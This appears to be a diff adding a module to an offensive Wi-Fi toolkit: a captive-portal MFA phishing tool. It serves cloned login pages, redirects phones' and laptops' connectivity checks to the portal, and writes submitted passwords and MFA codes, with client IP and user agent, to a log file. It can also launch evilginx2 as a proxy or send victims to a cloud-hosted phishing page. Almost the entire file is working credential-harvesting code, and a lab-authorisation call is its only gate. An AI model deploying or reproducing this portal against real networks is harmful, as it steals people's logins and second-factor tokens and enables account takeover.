@@ -1,0 +1,212 @@
+#!/usr/bin/env python3
+# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
+"""MFA phishing captive portal module.
+
+Real-time MFA token capture via captive portal — inspired by wifipumpkin3's
+Phishkin3 and evilginx2 methodology. Serves a portal that proxies to a
+real login page or presents a convincing clone, capturing both password
+and MFA token/push approval in real-time.
+
+Modes:
+  - local_clone     Serve local HTML clone with MFA field
+  - external_proxy  Reverse proxy to real login (evilginx-style)
+  - cloud_redirect  Redirect to cloud-hosted phishing page (Phishkin3-style)
+
+Version: 1.0.0
+"""
+
+from __future__ import annotations
+
+import http.server
+import json
+import logging
+import shutil
+import subprocess
+import threading
+from pathlib import Path
+from typing import Optional
+from urllib.parse import parse_qs
+
+from wirelessxpl.core.exploit import *
+
+from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab
+
+logger = logging.getLogger(__name__)
+
+
+class MFACredentialHandler(http.server.SimpleHTTPRequestHandler):
+    """HTTP handler capturing credentials + MFA tokens."""
+
+    credentials_log: Path = Path(".log/mfa_phishing_creds.json")
+    template_dir: str = ""
+    redirect_after: str = "/success.html"
+
+    def do_GET(self) -> None:
+        if self.path == "/" or self.path == "/index.html":
+            self.path = "/index.html"
+        elif self.path in ("/generate_204", "/hotspot-detect.html", "/connecttest.txt"):
+            self.send_response(302)
+            self.send_header("Location", "/")
+            self.end_headers()
+            return
+        self.directory = self.template_dir
+        super().do_GET()
+
+    def do_POST(self) -> None:
+        content_length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(content_length).decode("utf-8", errors="replace")
+        params = parse_qs(body)
+
+        cred_entry = {
+            "client_ip": self.client_address[0],
+            "user_agent": self.headers.get("User-Agent", ""),
+            "path": self.path,
+            "params": {k: v[0] if len(v) == 1 else v for k, v in params.items()},
+        }
+
+        self.credentials_log.parent.mkdir(parents=True, exist_ok=True)
+        with open(self.credentials_log, "a", encoding="utf-8") as f:
+            f.write(json.dumps(cred_entry) + "\n")
+
+        logger.info("MFA credential captured: %s", cred_entry)
+
+        self.send_response(302)
+        self.send_header("Location", self.redirect_after)
+        self.end_headers()
+
+    def log_message(self, fmt, *args) -> None:
+        logger.debug(fmt, *args)
+
+
+class Exploit(Exploit):
+    """MFA phishing via captive portal with real-time token capture."""
+
+    __info__ = {
+        "name": "MFA Phishing Portal",
+        "description": (
+            "Real-time MFA phishing via captive portal: local HTML clone with "
+            "MFA field, external proxy (evilginx-style), or cloud redirect "
+            "(Phishkin3-style). Captures password + MFA token/push approval. "
+            "Includes OS connectivity detection (Apple CNA, Google generate_204)."
+        ),
+        "authors": ("André Henrique (@mrhenrike) | União Geek",),
+        "references": (
+            "https://github.com/P0cL4bs/wifipumpkin3",
+            "https://github.com/kgretzky/evilginx2",
+        ),
+        "devices": ("wifi",),
+    }
+
+    mode = OptString("local_clone", "Mode: local_clone | external_proxy | cloud_redirect")
+    template = OptString(
+        "corporate_vpn",
+        "Template: corporate_vpn | oauth_social | isp_login | custom",
+    )
+    custom_template_dir = OptString("", "Path to custom template directory")
+    cloud_url = OptString("", "External phishing URL (for cloud_redirect)")
+    evilginx_domain = OptString("", "Domain for evilginx proxy (for external_proxy)")
+    portal_port = OptInteger(80, "HTTP port for portal")
+    ssl_port = OptInteger(443, "HTTPS port (if SSL enabled)")
+    enable_ssl = OptBool(False, "Enable HTTPS with self-signed cert")
+    interface = OptString("wlan0", "Interface for rogue AP")
+    connectivity_detection = OptBool(True, "Handle Apple/Google/Microsoft connectivity checks")
+    dry_run = OptBool(False, "Print config without executing")
+
+    def _resolve_template(self) -> Optional[Path]:
+        """Resolve phishing template directory."""
+        if self.template == "custom":
+            p = Path(self.custom_template_dir)
+            if p.is_dir():
+                return p
+            print_error("Custom template not found: {}".format(p))
+            return None
+
+        resources = Path(__file__).resolve().parents[3] / "resources" / "phishing_pages"
+        tpl = resources / self.template
+        if tpl.is_dir():
+            return tpl
+        print_error("Template '{}' not found.".format(self.template))
+        return None
+
+    def _run_evilginx_proxy(self) -> None:
+        """Launch evilginx2 for real-time MFA interception."""
+        if not shutil.which("evilginx"):
+            print_error("evilginx not found on PATH.")
+            return
+
+        print_status("Launching evilginx2 proxy on {}...".format(self.evilginx_domain))
+        try:
+            subprocess.run(["sudo", "evilginx"], check=False)
+        except KeyboardInterrupt:
+            print_info("\nevilginx interrupted.")
+
+    def _run_cloud_redirect(self) -> None:
+        """Redirect all HTTP to external cloud phishing URL."""
+        if not self.cloud_url:
+            print_error("cloud_url is required for cloud_redirect mode.")
+            return
+
+        print_status("Redirecting all traffic to {}".format(self.cloud_url))
+
+        class RedirectHandler(http.server.BaseHTTPRequestHandler):
+            cloud_target = self.cloud_url
+
+            def do_GET(self_inner) -> None:
+                self_inner.send_response(302)
+                self_inner.send_header("Location", self_inner.cloud_target)
+                self_inner.end_headers()
+
+            do_POST = do_GET
+
+            def log_message(self_inner, fmt, *args) -> None:
+                logger.debug(fmt, *args)
+
+        server = http.server.HTTPServer(("0.0.0.0", self.portal_port), RedirectHandler)
+        try:
+            server.serve_forever()
+        except KeyboardInterrupt:
+            server.shutdown()
+            print_info("\nRedirect server stopped.")
+
+    def run(self) -> None:
+        """Execute MFA phishing portal."""
+        valid_modes = ("local_clone", "external_proxy", "cloud_redirect")
+        if self.mode not in valid_modes:
+            print_error("Invalid mode '{}'. Choose: {}".format(self.mode, ", ".join(valid_modes)))
+            return
+
+        require_authorised_lab()
+
+        if self.dry_run:
+            print_info("DRY RUN — MFA phishing: {} mode".format(self.mode))
+            return
+
+        if self.mode == "external_proxy":
+            self._run_evilginx_proxy()
+            return
+
+        if self.mode == "cloud_redirect":
+            self._run_cloud_redirect()
+            return
+
+        tpl_dir = self._resolve_template()
+        if not tpl_dir:
+            return
+
+        MFACredentialHandler.template_dir = str(tpl_dir)
+        MFACredentialHandler.credentials_log = Path(".log") / "mfa_phishing_creds.json"
+
+        server = http.server.HTTPServer(("0.0.0.0", self.portal_port), MFACredentialHandler)
+        print_status("MFA portal on port {} — template: {}".format(self.portal_port, self.template))
+        print_info("Connectivity detection: {}".format("ON" if self.connectivity_detection else "OFF"))
+        print_info("Credentials log: {}".format(MFACredentialHandler.credentials_log))
+
+        try:
+            server.serve_forever()
+        except KeyboardInterrupt:
+            server.shutdown()
+
+        cred_log = MFACredentialHandler.credentials_log
+        if cred_log.exists():
+            count = sum(1 for _ in open(cred_log, encoding="utf-8"))
+            print_success("Captured {} MFA credential entries.".format(count))
